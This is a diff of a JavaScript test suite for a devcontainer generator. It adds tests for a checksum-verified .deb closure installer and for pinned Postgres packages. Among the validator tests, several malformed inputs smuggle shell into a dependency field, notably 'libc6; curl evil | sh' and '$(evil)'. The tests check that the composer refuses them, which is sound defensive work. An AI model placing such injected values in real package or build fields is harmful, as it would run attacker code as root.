@@ -566,7 +566,7 @@ checkAsync('wrapper-hosted repo (no package.json), nx+agent: neutral base, Node 
   ok(!('image' in a.dc) && a.dc.build?.dockerfile === 'house.Dockerfile' && a.dc.build?.context === '.', `build ${JSON.stringify(a.dc.build)}`);
   ok(/^FROM mcr\.microsoft\.com\/devcontainers\/base:debian$/m.test(a.dockerfile), 'house.Dockerfile is not FROM the neutral base');
   ok(a.dc.remoteUser === 'vscode', `remoteUser ${a.dc.remoteUser}`);
-  ok(a.dc.features['ghcr.io/devcontainers/features/node:1']?.version === '22', 'the Node feature, pinned to the node major');
+  ok(a.dc.features['ghcr.io/devcontainers/features/node:1.7.1']?.version === '22', 'the Node feature, pinned to the node major');
   ok(JSON.stringify(a.dc.overrideFeatureInstallOrder) === '["ghcr.io/devcontainers/features/node"]', 'Node installs first');
   ok(a.dc.mounts.some((m) => m.includes('target=/home/vscode/.claude')), 'the .claude mount follows the image user');
   ok(a.dc.mounts.some((m) => m.endsWith('/.nx/cache,type=volume')) && !a.dc.mounts.some((m) => m.endsWith('/.nx,type=volume')), 'Nx state on exact volumes, never over .nx/ (it holds the committed nxw.js)');
@@ -646,7 +646,7 @@ checkAsync('npm package.json repo, nx+agent+node: typescript-node, npx nx, no we
   tree.write('package-lock.json', '{}');
   const a = await artifacts(tree, ['nx', 'agent', 'node']);
   ok(/^FROM mcr\.microsoft\.com\/devcontainers\/typescript-node:22$/m.test(a.dockerfile) && a.dc.remoteUser === 'node', 'house.Dockerfile is not FROM typescript-node:22 (or remoteUser lost)');
-  ok(!a.dc.features['ghcr.io/devcontainers/features/node:1'] && !a.dc.overrideFeatureInstallOrder, 'no Node feature on a Node image');
+  ok(!a.dc.features['ghcr.io/devcontainers/features/node:1.7.1'] && !a.dc.overrideFeatureInstallOrder, 'no Node feature on a Node image');
   ok(a.dc.mounts.some((m) => m.includes('node_modules,type=volume')) && a.dc.remoteEnv.CHOKIDAR_USEPOLLING === 'true', 'node artifacts');
   ok(
     a.dc.remoteEnv.PATH === '/home/node/.local/bin:${containerWorkspaceFolder}/node_modules/.bin:${containerEnv:PATH}',
@@ -950,6 +950,296 @@ checkAsync('image: an archive tool installs at its pin, is a no-op when current,
   }
 });
 
+// A `.deb` CLOSURE (a fragment's `archives`, format `deb`): the same one installer, run against a re-rooted filesystem with
+// curl, uname, apt-get and sudo stubbed — but REAL `.deb` files through the real dpkg-deb. Download-and-check before anything
+// changes, what Debian must supply, unpack, prune, wrappers (a `.deb`'s binaries have no RUNPATH), a moved pin, and every way
+// it must fail loudly. tools/postgres-debs/run-closure.mjs is the same run on the real closures, by hand.
+checkAsync('image: a .deb closure unpacks at its pin behind wrappers, satisfies Debian without Recommends, and a moved pin switches cleanly', async (ok) => {
+  const { createHash } = await import('node:crypto');
+  const { compose, renderOsPackagesScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
+  const dir = mkdtempSync(join(tmpdir(), 'deb-closure-'));
+  const [stubs, root, served] = [join(dir, 'stubs'), join(dir, 'root'), join(dir, 'served')];
+  for (const path of [stubs, served, join(root, 'etc'), join(root, 'usr/local/bin')]) mkdirSync(path, { recursive: true });
+  /** A real `.deb` with a `bin/<tool>` per name (each prints its name, version and LD_LIBRARY_PATH), a library dir and docs. */
+  const deb = (name, version, tools) => {
+    const src = join(dir, `src-${name}-${version}`);
+    for (const path of ['DEBIAN', 'usr/lib/x86_64-linux-gnu', 'usr/share/doc/x', 'tree/bin']) mkdirSync(join(src, path), { recursive: true });
+    writeFileSync(join(src, 'DEBIAN/control'), `Package: ${name}\nVersion: ${version}\nArchitecture: amd64\nMaintainer: t <t@t.test>\nDescription: t\n`);
+    writeFileSync(join(src, `usr/lib/x86_64-linux-gnu/lib${name}.so`), '');
+    writeFileSync(join(src, 'usr/share/doc/x/README'), 'docs\n');
+    for (const tool of tools) writeFileSync(join(src, 'tree/bin', tool), `#!/bin/sh\necho "${tool} ${version} [$LD_LIBRARY_PATH] $*"\n`, { mode: 0o755 });
+    writeFileSync(join(src, 'tree/bin/not-executable'), 'data\n', { mode: 0o644 });
+    const file = join(served, `${name}_${version}_amd64.deb`);
+    execFileSync('dpkg-deb', ['-b', '--root-owner-group', src, file], { stdio: 'ignore' });
+    return { url: `https://archives.test/${name}_${version}_amd64.deb`, sha256: createHash('sha256').update(readFileSync(file)).digest('hex') };
+  };
+  const log = join(dir, 'calls.log');
+  writeFileSync(join(stubs, 'curl'), `#!/bin/sh\nfor a; do case "$a" in https://*) url="$a" ;; esac; done\nwhile [ $# -gt 0 ]; do [ "$1" = -o ] && out="$2"; shift; done\necho "curl $url" >> '${log}'\ncp '${served}'/"\${url##*/}" "$out"\n`, { mode: 0o755 });
+  writeFileSync(join(stubs, 'apt-get'), `#!/bin/sh\necho "apt-get $*" >> '${log}'\n[ ! -e '${dir}/apt-fails' ] || [ "$1" != satisfy ]\n`, { mode: 0o755 });
+  writeFileSync(join(stubs, 'uname'), '#!/bin/sh\necho x86_64\n', { mode: 0o755 });
+  writeFileSync(join(stubs, 'dpkg-query'), "#!/bin/sh\nprintf 'install ok installed'\n", { mode: 0o755 });
+  writeFileSync(join(stubs, 'sudo'), '#!/bin/sh\nexec "$@"\n', { mode: 0o755 });
+  writeFileSync(join(stubs, 'sleep'), '#!/bin/sh\n', { mode: 0o755 });
+  const DEPENDS = 'libc6 (>= 2.38), libicu76 (>= 76.1-1~), libz (>= 1:1.1.4) | libz-ng, tzdata';
+  const tool = (version, debs, extra = {}) => ({
+    format: 'deb',
+    id: 'tool',
+    bin: 'tree/bin',
+    libraryPaths: ['usr/lib/*-linux-gnu'],
+    prune: ['usr/share/doc', 'tree/bin/pruned'],
+    closures: { trixie: { version, systemDepends: DEPENDS, packages: { amd64: debs } } },
+    ...extra,
+  });
+  const render = (...archives) => renderOsPackagesScript(compose([{ id: 'x', fragment: { image: { ref: 'img', remoteUser: 'node' }, archives } }], { nodeMajor: '22' }));
+  const runIt = (text, ...lists) => {
+    writeFileSync(join(dir, 'house.packages.sh'), text);
+    rmSync(log, { force: true });
+    let result;
+    try {
+      result = { status: 0, output: execFileSync('sh', ['-c', 'sh "$@" 2>&1', 'sh', join(dir, 'house.packages.sh'), ...lists], { env: { PATH: `${stubs}:${process.env.PATH}`, HOUSE_PACKAGES_ROOT: root }, encoding: 'utf8', cwd: dir, stdio: ['ignore', 'pipe', 'pipe'] }) };
+    } catch (error) {
+      result = { status: error.status, output: `${error.stdout}${error.stderr}` };
+    }
+    return { ...result, calls: existsSync(log) ? readFileSync(log, 'utf8').trim().split('\n') : [] };
+  };
+  const home = join(root, 'opt/bespunky/tool');
+  const links = join(root, 'usr/local/bin');
+  const wrapped = (name, env = {}, ...args) => execFileSync(join(links, name), args, { encoding: 'utf8', env: { PATH: process.env.PATH, ...env } }).trim();
+  writeFileSync(join(root, 'etc/os-release'), 'ID=debian\nVERSION_CODENAME="trixie"\n');
+  try {
+    const a1 = deb('a', '1.0', ['hello', 'only-v1', 'pruned']);
+    const b1 = deb('b', '1.0', ['other']);
+    const v1 = render(tool('1.0-aaaa', [a1, b1]));
+
+    // The rendered script's shape.
+    ok(shParses(v1) && !v1.includes('{{'), 'the closure script does not parse under sh, or kept a placeholder');
+    ok(v1.includes(`tool tool tree/bin usr/lib/*-linux-gnu usr/share/doc,tree/bin/pruned\n`) && v1.includes(`closure tool trixie 1.0-aaaa ${DEPENDS}\n`) && v1.includes(`deb tool trixie amd64 ${a1.sha256} ${a1.url}\n`), 'the closure lines are not in the script');
+    ok(v1.includes('curl ca-certificates') && v1.includes('(HOUSE_DEB_ARCHIVES, below)'), 'a closure did not bring its fetch tools');
+    ok(!/install_archive|HOUSE_ARCHIVES=/.test(v1) && /install_deb_archive "\$\{id#deb:\}"/.test(v1), 'a closure-only script carries the tarball machinery, or lacks its own');
+    // The apt rules hold: Debian by NAME and without Recommends, the closure through dpkg-deb. Nothing registers with dpkg.
+    ok(/apt-get satisfy -y --no-install-recommends "\$1"/.test(v1) && /dpkg-deb -x /.test(v1), 'the closure is not satisfied and unpacked as designed');
+    ok(!/apt-key|signed-by|dpkg -i|apt-get install [^\n]*\.deb|sources\.list/.test(v1), 'a third-party apt mechanism crept into the closure installer');
+
+    const first = runIt(v1);
+    ok(first.status === 0, `fresh install: ${JSON.stringify(first)}`);
+    ok(readlinkSafe(join(home, 'current')) === '1.0-aaaa' && existsSync(join(home, '1.0-aaaa/tree/bin/hello')) && !existsSync(join(home, '.partial')), 'the pinned release is not current, or a partial was left');
+    // Everything downloaded and checked BEFORE apt is asked, and apt asked for exactly the string, without Recommends.
+    ok(first.calls.join('|') === `curl ${a1.url}|curl ${b1.url}|apt-get update|apt-get satisfy -y --no-install-recommends ${DEPENDS}`, `the install order: ${first.calls.join(' | ')}`);
+    const libs = join(home, 'current/usr/lib/x86_64-linux-gnu');
+    ok(wrapped('hello', {}, 'x', 'y z') === `hello 1.0 [${libs}] x y z`, `the wrapper's environment or arguments: ${wrapped('hello', {}, 'x', 'y z')}`);
+    ok(wrapped('hello', { LD_LIBRARY_PATH: '/theirs' }) === `hello 1.0 [${libs}:/theirs]`, 'the wrapper replaced LD_LIBRARY_PATH instead of adding to it');
+    ok(wrapped('other') === `other 1.0 [${libs}]`, 'every package in the closure is one tree');
+    ok(!lstatSync(join(links, 'hello')).isSymbolicLink(), 'a plain link is not enough: there would be no LD_LIBRARY_PATH');
+    ok(!lexists(join(links, 'not-executable')), 'a non-executable got a wrapper');
+    ok(!existsSync(join(home, 'current/usr/share/doc')) && !lexists(join(links, 'pruned')) && existsSync(join(home, 'current/usr/lib')), 'prune did not remove its paths (or the wrapper of a pruned executable), or removed more');
+
+    const again = runIt(v1);
+    ok(again.status === 0 && again.calls.length === 0 && /all present/.test(again.output), `at the pin, the installer still acted: ${JSON.stringify(again)}`);
+
+    // A version names the whole closure: it moves, it reinstalls, the old release and its gone wrapper leave.
+    const a2 = deb('a', '2.0', ['hello']);
+    const moved = runIt(render(tool('2.0-bbbb', [a2])));
+    ok(moved.status === 0 && readlinkSafe(join(home, 'current')) === '2.0-bbbb' && wrapped('hello') === `hello 2.0 [${libs}]`, `a moved pin did not switch: ${JSON.stringify(moved)}`);
+    ok(!existsSync(join(home, '1.0-aaaa')) && !lexists(join(links, 'only-v1')) && !lexists(join(links, 'other')), 'a moved pin left the old release or a wrapper it no longer has');
+    const back = runIt(v1);
+    ok(back.status === 0 && readlinkSafe(join(home, 'current')) === '1.0-aaaa' && wrapped('hello') === `hello 1.0 [${libs}]`, 'moving the pin BACK did not switch');
+
+    // Refusals. Each leaves the installed release exactly as it was.
+    const tampered = runIt(render(tool('3.0-cccc', [a2, { ...b1, sha256: 'f'.repeat(64) }])));
+    ok(tampered.status !== 0 && /does not match its pinned sha256/.test(tampered.output) && readlinkSafe(join(home, 'current')) === '1.0-aaaa', `a checksum mismatch was installed: ${JSON.stringify(tampered)}`);
+    ok(!tampered.calls.some((call) => call.startsWith('apt-get')), 'a bad file still reached apt: it must change nothing on this machine');
+    writeFileSync(join(dir, 'apt-fails'), '');
+    const noDebian = runIt(render(tool('3.0-cccc', [a2])));
+    rmSync(join(dir, 'apt-fails'));
+    ok(noDebian.status !== 0 && noDebian.calls.filter((call) => call.startsWith('apt-get satisfy')).length === 3 && /Debian could not supply what tool needs/.test(noDebian.output) && readlinkSafe(join(home, 'current')) === '1.0-aaaa', `a failing satisfy must retry 3x, fail, and leave current: ${JSON.stringify(noDebian)}`);
+    const noLibs = runIt(render(tool('3.0-cccc', [a2], { libraryPaths: ['nowhere/*'] })));
+    ok(noLibs.status !== 0 && /could not run/.test(noLibs.output) && readlinkSafe(join(home, 'current')) === '1.0-aaaa', `a closure with no library dir went live: ${JSON.stringify(noLibs)}`);
+
+    // Never over somebody else's file (a plain file, or a link), whichever the wrapper's name.
+    rmSync(join(links, 'hello'));
+    writeFileSync(join(links, 'hello'), 'theirs\n');
+    const foreign = runIt(render(tool('2.0-bbbb', [a2])));
+    ok(foreign.status === 0 && readFileSync(join(links, 'hello'), 'utf8') === 'theirs\n' && /not tool's — left alone/.test(foreign.output), `a file the installer did not make was clobbered: ${JSON.stringify(foreign)}`);
+    rmSync(join(links, 'hello'));
+
+    // Another Debian release, none at all, another architecture: loud, naming what it has. The exit is what post-create reports.
+    writeFileSync(join(root, 'etc/os-release'), 'ID=debian\nVERSION_CODENAME=forky\n');
+    const forky = runIt(render(tool('4.0-dddd', [a2])));
+    ok(forky.status !== 0 && /no closure for this Debian release \('forky'; it has: trixie \)/.test(forky.output) && forky.calls.length === 0, `an unknown codename did not fail loudly: ${JSON.stringify(forky)}`);
+    rmSync(join(root, 'etc/os-release'));
+    const unreadable = runIt(render(tool('4.0-dddd', [a2])));
+    ok(unreadable.status !== 0 && /'unknown'/.test(unreadable.output), `an image with no os-release did not fail loudly: ${JSON.stringify(unreadable)}`);
+    writeFileSync(join(root, 'etc/os-release'), 'VERSION_CODENAME=trixie\n');
+    const armOnly = runIt(render({ ...tool('4.0-dddd', []), closures: { trixie: { version: '4.0-dddd', systemDepends: DEPENDS, packages: { arm64: [a2] } } } }));
+    ok(armOnly.status !== 0 && /no closure for this architecture \(amd64\) on trixie/.test(armOnly.output) && armOnly.calls.length === 0, `an architecture with no closure did not fail loudly: ${JSON.stringify(armOnly)}`);
+
+    // The refusal of `name=version` holds in a script that also carries closures: that road stays closed.
+    const list = join(dir, 'os-packages.txt');
+    writeFileSync(list, 'libfoo=1.2\n');
+    writeFileSync(join(stubs, 'dpkg-query'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
+    const pinnedName = runIt(render(tool('2.0-bbbb', [a2])), list);
+    ok(/ignoring 'libfoo=1.2' — not a Debian package name/.test(pinnedName.output) && !pinnedName.calls.some((call) => /install .*libfoo/.test(call)), `name=version reached apt: ${JSON.stringify(pinnedName)}`);
+    writeFileSync(join(stubs, 'dpkg-query'), "#!/bin/sh\nprintf 'install ok installed'\n", { mode: 0o755 });
+
+    // Both formats in one script, each by its own path.
+    const src = join(dir, 'tarball/tar/bin');
+    mkdirSync(src, { recursive: true });
+    writeFileSync(join(src, 'tarred'), '#!/bin/sh\necho tarred\n', { mode: 0o755 });
+    execFileSync('tar', ['-czf', join(served, 'tar-1.tar.gz'), '-C', join(dir, 'tarball'), 'tar']);
+    const tarball = { id: 'tar', version: '1', bin: 'tar/bin', downloads: { amd64: { url: 'https://archives.test/tar-1.tar.gz', sha256: createHash('sha256').update(readFileSync(join(served, 'tar-1.tar.gz'))).digest('hex') } } };
+    const both = runIt(render(tarball, tool('5.0-eeee', [a2])));
+    ok(both.status === 0 && wrapped('tarred') === 'tarred' && lstatSync(join(links, 'tarred')).isSymbolicLink() && wrapped('hello') === `hello 2.0 [${libs}]`, `tarball and closure in one script: ${JSON.stringify(both)}`);
+    ok(both.status === 0 && /\(HOUSE_ARCHIVES, HOUSE_DEB_ARCHIVES, below\)/.test(render(tarball, tool('5.0-eeee', [a2]))), 'both lists are not named as fetched');
+    const tarOnly = render(tarball);
+    ok(!/HOUSE_DEB_ARCHIVES|install_deb_archive|VERSION_CODENAME|satisfy|dpkg-deb/.test(tarOnly) && shParses(tarOnly), 'a tarball-only script carries the closure machinery: every project with one would rebuild its image for nothing');
+
+    // The composer refuses what the installer would run as root.
+    const refuses = (archive, what) => {
+      try {
+        render(archive);
+        ok(false, `the composer accepted ${what}`);
+      } catch (error) {
+        ok(/is malformed/.test(error.message), `${what}: ${error.message}`);
+      }
+    };
+    const closure = (patch) => ({ ...tool('1', [a1]), closures: { trixie: { version: '1', systemDepends: DEPENDS, packages: { amd64: [a1] }, ...patch } } });
+    refuses(closure({ systemDepends: 'libc6; curl evil | sh' }), 'shell in systemDepends');
+    refuses(closure({ systemDepends: '$(evil)' }), 'a substitution in systemDepends');
+    refuses(closure({ version: '../up' }), 'a version that leaves its directory');
+    refuses(closure({ packages: {} }), 'a codename with no packages');
+    refuses(closure({ packages: { amd64: [] } }), 'an architecture with no packages');
+    refuses(closure({ packages: { amd64: [{ url: 'http://x.test/a.deb', sha256: a1.sha256 }] } }), 'a plain-http url');
+    refuses(closure({ packages: { amd64: [{ url: 'https://x.test/a.tar.gz', sha256: a1.sha256 }] } }), 'a url that is not a .deb');
+    refuses(closure({ packages: { amd64: [{ url: a1.url, sha256: 'abc' }] } }), 'a malformed sha256');
+    refuses(closure({ packages: { riscv64: [a1] } }), 'an unknown architecture');
+    refuses({ ...tool('1', [a1]), closures: {} }, 'no closures at all');
+    refuses({ ...tool('1', [a1]), closures: { 'Tri xie': tool('1', [a1]).closures.trixie } }, 'a malformed codename');
+    refuses(tool('1', [a1], { bin: '../bin' }), 'a bin that leaves the tree');
+    refuses(tool('1', [a1], { libraryPaths: [] }), 'no library paths');
+    refuses(tool('1', [a1], { libraryPaths: ['../*'] }), 'a library path that leaves the tree');
+    refuses(tool('1', [a1], { prune: ['tree/*'] }), 'a prune pattern');
+    refuses(tool('1', [a1], { prune: ['tree'] }), 'a prune path that holds bin');
+    refuses(tool('1', [a1], { id: 'No Good' }), 'a malformed id');
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+// Persistence: a closure lives in the IMAGE, in a cached layer, outside every persisted directory. Nothing of its own needs a
+// mount, and a mount over either of its two homes would hide what the image built.
+check('no layer declares a floating devcontainer feature: a bare id is `latest` and a major tag moves within its major, with no commit behind either', (ok) => {
+  const found = [];
+  const tree = createTreeWithEmptyWorkspace();
+  const walk = (node, where) => {
+    if (!node || typeof node !== 'object') return;
+    for (const [key, value] of Object.entries(node)) {
+      if (key === 'features' && Array.isArray(value)) found.push(...value.map((feature) => ({ where, id: feature.id })));
+      else walk(value, where);
+    }
+  };
+  for (const layer of registry.LAYERS) walk(typeof layer.devcontainer === 'function' ? layer.devcontainer(tree) : layer.devcontainer, layer.id);
+  ok(found.length >= 2, `the walk sees the layers' features: ${JSON.stringify(found)}`);
+  for (const { where, id } of found) {
+    ok(/:\d+\.\d+\.\d+$/.test(id) || /@sha256:[0-9a-f]{64}$/.test(id), `${where}: ${id} names no exact version. Pin it in _utils/versions.ts.`);
+  }
+});
+
+checkAsync('persistence: an archive tool needs no mount, and no layer mounts over where it is installed', async (ok) => {
+  const { compose, renderOsPackagesScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
+  const fragmentOf = (entry, tree) => (typeof entry.devcontainer === 'function' ? entry.devcontainer(tree) : entry.devcontainer);
+  const tree = createTreeWithEmptyWorkspace();
+  writeJson(tree, 'firebase.json', {});
+  tree.write('.nvmrc', '22\n');
+  const contributors = registry.LAYERS.filter((entry) => entry.devcontainer).map((entry) => ({ id: entry.id, fragment: fragmentOf(entry, tree) }));
+  const closure = { format: 'deb', id: 'tool', bin: 'bin', libraryPaths: ['lib'], closures: { trixie: { version: '1', systemDepends: 'tzdata', packages: { amd64: [{ url: 'https://x.test/a.deb', sha256: 'a'.repeat(64) }] } } } };
+  const without = compose(contributors, { nodeMajor: '22' });
+  const composed = compose([...contributors, { id: 'test', fragment: { archives: [closure] } }], { nodeMajor: '22' });
+  ok(composed.mounts.length === without.mounts.length, 'an archive tool added a mount');
+  const covers = (target, path) => path === target || path.startsWith(`${target.replace(/\/$/, '')}/`) || target.startsWith(`${path}/`);
+  for (const { mount } of composed.mounts) {
+    const target = /target=([^,]+)/.exec(mount)?.[1] ?? '';
+    ok(!covers(target, '/opt/bespunky') && !covers(target, '/usr/local/bin'), `the mount ${target} would hide what the image's archive layer built`);
+  }
+  ok(shParses(renderOsPackagesScript(composed)), 'every layer plus a closure does not parse');
+  // The image build and post-create (an adopted image) run this one installer: closures come with no path of their own.
+  const a = await artifacts(wrapperRepo(), ['nx', 'agent']);
+  ok(/RUN sh \/tmp\/bespunky-os-packages\/house\.packages\.sh/.test(a.dockerfile) && /if sh \.devcontainer\/house\.packages\.sh \.devcontainer\/os-packages\.txt; then/.test(a.post), 'the image build and post-create no longer share the one installer');
+});
+
+// The Postgres closures table, OFFLINE (tools/postgres-debs/project.mjs re-asks the archive on a schedule and before a
+// publish): it covers the pins, it is exactly what the tool writes (so a hand-edit shows), and the selection rules hold
+// against indexes with the futures that would break them.
+checkAsync('postgres closures: the table covers the pins, is exactly what its tool renders, and libpq5 is selected by major', async (ok) => {
+  const { buildClosure, parsePackages, render, selectPackages, signedBy } = await import('../postgres-debs/closure.mjs');
+  // A status of a good signature by another key in the keyring: the key file served may hold more than PGDG's.
+  const statusBy = (primary) => `[GNUPG:] GOODSIG ABCD someone\n[GNUPG:] VALIDSIG SUBKEY 2026-11-04 1 0 4 0 1 10 01 ${primary}\n`;
+  ok(signedBy(statusBy('AAAA'), 'AAAA') && !signedBy(statusBy('BBBB'), 'AAAA') && !signedBy('[GNUPG:] GOODSIG ABCD someone\n', 'AAAA'), 'a signature is not held to the fingerprint');
+  const versions = require_(join(BUILD, 'src/generators/_utils/versions'));
+  const { POSTGRES_CLOSURES, POSTGRES_CLOSURES_AS_OF } = require_(join(BUILD, 'src/generators/_utils/postgres-closures'));
+  const { compose, renderOsPackagesScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
+  const source = readFileSync(join(PAYLOAD, 'src/generators/_utils/postgres-closures.ts'), 'utf8');
+  ok(render(POSTGRES_CLOSURES, POSTGRES_CLOSURES_AS_OF) === source, 'postgres-closures.ts is not what its tool renders (hand-edited?): node tools/postgres-debs/project.mjs --write');
+  ok(/^\d{4}-\d{2}-\d{2}$/.test(POSTGRES_CLOSURES_AS_OF), 'the table has no as-of date');
+  ok(Object.keys(POSTGRES_CLOSURES).sort().join() === [...versions.POSTGRES_MAJORS].sort().join(), `the table's majors are not the pins: ${Object.keys(POSTGRES_CLOSURES)} (node tools/postgres-debs/project.mjs --write)`);
+  for (const major of versions.POSTGRES_MAJORS) {
+    const closures = POSTGRES_CLOSURES[major] ?? {};
+    ok(Object.keys(closures).join() === versions.POSTGRES_DEB_CODENAMES.join(), `Postgres ${major}'s codenames are not the pins: ${Object.keys(closures)}`);
+    for (const [codename, closure] of Object.entries(closures)) {
+      ok(closure.version.startsWith(`${major}.`), `${major}/${codename} is named ${closure.version}`);
+      ok(Object.keys(closure.packages).join() === versions.POSTGRES_DEB_ARCHITECTURES.join(), `${major}/${codename}'s architectures are not the pins`);
+      ok(!/postgresql-common|ssl-cert|debconf|locales|\blibpq5\b/.test(closure.systemDepends) && /\btzdata\b/.test(closure.systemDepends), `${major}/${codename}'s systemDepends has the packaging, the closure's own, or lacks tzdata: ${closure.systemDepends}`);
+      for (const [arch, debs] of Object.entries(closure.packages)) {
+        const names = debs.map(({ url }) => /\/([^/_]+)_[^/]+\.deb$/.exec(url)[1]);
+        ok(names.join() === [`postgresql-${major}`, `postgresql-client-${major}`, 'libpq5', ...versions.POSTGRES_EXTENSIONS.map((extension) => `postgresql-${major}-${extension}`)].join(), `${major}/${codename}/${arch}: ${names}`);
+        ok(debs.some(({ url }) => url.includes(`/libpq5_${major}.`)), `${major}/${codename}/${arch} pins another major's libpq5`);
+        ok(debs.every(({ url }) => !url.includes('~') && url.startsWith('https://apt-archive.postgresql.org/')), `${major}/${codename}/${arch} pins a prerelease, or leaves the archive`);
+      }
+    }
+    // Real data through the format's own validation.
+    const tool = { format: 'deb', id: 'postgres', bin: `usr/lib/postgresql/${major}/bin`, libraryPaths: ['usr/lib/*-linux-gnu'], closures };
+    ok(shParses(renderOsPackagesScript(compose([{ id: 'x', fragment: { image: { ref: 'img', remoteUser: 'node' }, archives: [tool] } }], { nodeMajor: '22' }))), `the real Postgres ${major} table does not render`);
+  }
+
+  // The rules, against an index shaped like the day 19 is GA: a stable libpq5 19.0, with no tilde.
+  const stanza = (name, version, depends = '') => `Package: ${name}\nVersion: ${version}\nDepends: ${depends}\nFilename: pool/${name}_${version}.deb\nSHA256: ${'a'.repeat(64)}\n`;
+  const index = (extra = []) =>
+    parsePackages(
+      [
+        stanza('postgresql-18', '18.6-1.pgdg13+2', 'locales | locales-all, postgresql-client-18 (= 18.6-1.pgdg13+2), postgresql-common (>= 275~), ssl-cert, tzdata, debconf (>= 0.5) | debconf-2.0, libc6 (>= 2.38), libpq5 (>= 17~~), libssl3t64 (>= 3.4.0)'),
+        stanza('postgresql-18', '18.5-1.pgdg13+1'),
+        stanza('postgresql-client-18', '18.6-1.pgdg13+2', 'libpq5 (>= 18.6), postgresql-client-common (>= 182~), sensible-utils, libc6 (>= 2.34), libssl3t64 (>= 3.0.0)'),
+        stanza('postgresql-18-pgvector', '0.8.7-1.pgdg13+1', 'postgresql-18, libc6 (>= 2.38)'),
+        stanza('libpq5', '17.11-1.pgdg13+2'),
+        stanza('libpq5', '18.6-1.pgdg13+2', 'libc6 (>= 2.38)'),
+        stanza('libpq5', '19~rc1-1.pgdg13+1'),
+        ...extra,
+      ].join('\n'),
+    );
+  const version = (selected, name) => selected.find((entry) => entry.name === name)?.version;
+  ok(version(selectPackages(index(), '18', ['pgvector']), 'libpq5') === '18.6-1.pgdg13+2', 'libpq5 is not the major\'s, with a prerelease of the next one in the index');
+  ok(version(selectPackages(index([stanza('libpq5', '19.0-1.pgdg13+1')]), '18', ['pgvector']), 'libpq5') === '18.6-1.pgdg13+2', 'at 19 GA, Postgres 18 would float to libpq5 19.0: a "no tilde" rule is back');
+  ok(version(selectPackages(index([stanza('postgresql-18', '18.7~beta-1')]), '18', []), 'postgresql-18') === '18.6-1.pgdg13+2', 'a prerelease server was selected');
+  const fails = (fn, pattern, what) => {
+    try {
+      fn();
+      ok(false, what);
+    } catch (error) {
+      ok(pattern.test(error.message), `${what}: ${error.message}`);
+    }
+  };
+  fails(() => selectPackages(index(), '17', []), /no stable postgresql-17/, 'a major the index lacks was not refused');
+  fails(() => selectPackages(parsePackages([stanza('postgresql-18', '18.6-1'), stanza('postgresql-client-18', '18.6-1'), stanza('libpq5', '19.0-1')].join('\n')), '18', []), /no stable libpq5/, 'with only another major\'s libpq5 it was not refused');
+  fails(() => selectPackages(parsePackages([stanza('postgresql-18', '18.6-1'), stanza('postgresql-client-18', '18.6-1', 'libpq5 (>= 18.6)'), stanza('libpq5', '18.5-1')].join('\n')), '18', []), /wants libpq5/, 'a libpq5 older than its client asks for was not refused');
+  const selected = selectPackages(index(), '18', ['pgvector']);
+  const closure = buildClosure({ amd64: selected, arm64: selected }, 'https://archive.test');
+  ok(closure.systemDepends === 'libc6 (>= 2.38), libssl3t64 (>= 3.4.0), tzdata', `systemDepends drops packaging and each other, merging to the highest minimum: ${closure.systemDepends}`);
+  ok(closure.version.startsWith('18.6-') && closure.packages.amd64[0].url === 'https://archive.test/pool/postgresql-18_18.6-1.pgdg13+2.deb', `the closure: ${JSON.stringify(closure).slice(0, 200)}`);
+  const movedExtension = selectPackages(index([stanza('postgresql-18-pgvector', '0.8.8-1.pgdg13+1', 'postgresql-18')]), '18', ['pgvector']);
+  ok(buildClosure({ amd64: movedExtension, arm64: movedExtension }, 'https://archive.test').version !== closure.version, 'an extension moved with the server still: the directory name did not, so nothing would reinstall');
+  const onlyArm = selectPackages(parsePackages([stanza('postgresql-18', '18.6-1', 'libarm1'), stanza('postgresql-client-18', '18.6-1'), stanza('libpq5', '18.6-1')].join('\n')), '18', []);
+  fails(() => buildClosure({ amd64: selected, arm64: onlyArm }, 'https://archive.test'), /need different Debian packages/, 'architectures needing different Debian names were not refused');
+});
+
 checkAsync('image: an adopted devcontainer gets no second image source — and one that builds from house.Dockerfile is the house\'s', async (ok) => {
   // Its image IS the house's ref: still its own key, so `build` must not be added beside it (two image sources).
   const same = wrapperRepo();
@@ -1159,7 +1449,7 @@ checkAsync('adopted devcontainer on its own image: only the active layers merged
   ok(!a.dc.mounts.some((m) => m.includes('/.local,')), 'the ~/.local volume was mounted over a FOREIGN image (it would freeze what that image ships there)');
   ok(!('remoteUser' in a.dc), `a remoteUser was imposed on an image that may not have it: ${a.dc.remoteUser}`);
   ok(a.dc.mounts.some((m) => m.includes('target=/root/.claude')), `the .claude mount follows the image's user: ${a.dc.mounts}`);
-  ok(a.dc.features['ghcr.io/devcontainers/features/node:1'], 'Node arrives as a feature (the house tooling needs it)');
+  ok(a.dc.features['ghcr.io/devcontainers/features/node:1.7.1'], 'Node arrives as a feature (the house tooling needs it)');
   ok(!/node_modules|tigervnc|4200|CHOKIDAR/.test(a.dcText), 'an inactive layer leaked into the adopted devcontainer');
   ok(a.dc.postCreateCommand === 'pip install -r requirements.txt' && tree.exists('.devcontainer/post-create.bespunky.sh'), 'their postCreate kept; house script beside it');
   const marker = JSON.parse(tree.read('.devcontainer/.bespunky-devcontainer.json', 'utf8'));
@@ -1170,7 +1460,7 @@ checkAsync('adopted devcontainer: the house RECORDS what it added, keeps it acro
   const prov = require_(join(BUILD, 'src/generators/_utils/devcontainer-provenance'));
   const DC = '.devcontainer/devcontainer.json';
   const MARKER = '.devcontainer/.bespunky-devcontainer.json';
-  const GH = 'ghcr.io/devcontainers/features/github-cli';
+  const GH = 'ghcr.io/devcontainers/features/github-cli:1.1.3';
   const OURS = 'ghcr.io/example/features/ours';
   const tree = wrapperRepo();
   tree.write(DC, `{\n  "image": "python:3.12",\n  "features": { "${OURS}": {} },\n  "postCreateCommand": "pip install -r requirements.txt"\n}\n`);
@@ -1184,6 +1474,15 @@ checkAsync('adopted devcontainer: the house RECORDS what it added, keeps it acro
   const pathEntry = recorded().find((e) => e.path.join('.') === 'remoteEnv.PATH');
   ok(pathEntry, 'remoteEnv.PATH (a whole remoteEnv map written at once) is recorded per entry');
   ok(prov.houseWrote(tree, { path: ['features', GH], value: {} }) && !prov.houseWrote(tree, { path: ['features', OURS], value: {} }), 'houseWrote answers from the record');
+
+  // A feature the project declares under another tag is that feature: a second key would install it twice.
